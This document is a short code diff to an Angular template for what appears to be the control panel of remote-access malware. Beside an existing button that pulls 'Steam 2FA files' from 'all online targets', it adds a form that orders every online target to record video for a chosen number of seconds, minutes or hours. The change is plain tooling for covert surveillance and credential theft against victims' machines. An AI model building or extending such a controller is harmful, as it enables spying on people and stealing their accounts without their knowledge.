@@ -59,4 +59,23 @@
     <button mat-button color="accent" (click)="sendCommandToAllOnlineTargets('getSteam2fa')">Get Steam 2FA
       Files</button>
   </div>
+  <div>
+    <form [formGroup]="videoRecordFormAll">
+      <button mat-button [disabled]="!videoRecordFormAll.valid" color="accent"
+        (click)="sendCommandToAllOnlineTargets('videoRecord', concatTime(videoRecordFormAll))">Video Record</button>
+      <mat-form-field appearance="fill" class="timeInput">
+        <mat-label>Time amount</mat-label>
+        <input matInput required type="number" min="1" #timeAmount formControlName="timeAmount">
+        <mat-error *ngIf="videoRecordFormAll.get('timeAmount')?.invalid">Not a valid number...</mat-error>
+      </mat-form-field>
+      <mat-form-field appearance="fill" class="timeInput">
+        <mat-label>Time units</mat-label>
+        <select matNativeControl required #timeUnits formControlName="timeUnits">
+          <option value="s">Seconds</option>
+          <option value="m">Minutes</option>
+          <option value="h">Hours</option>
+        </select>
+      </mat-form-field>
+    </form>
+  </div>
 </mat-card>
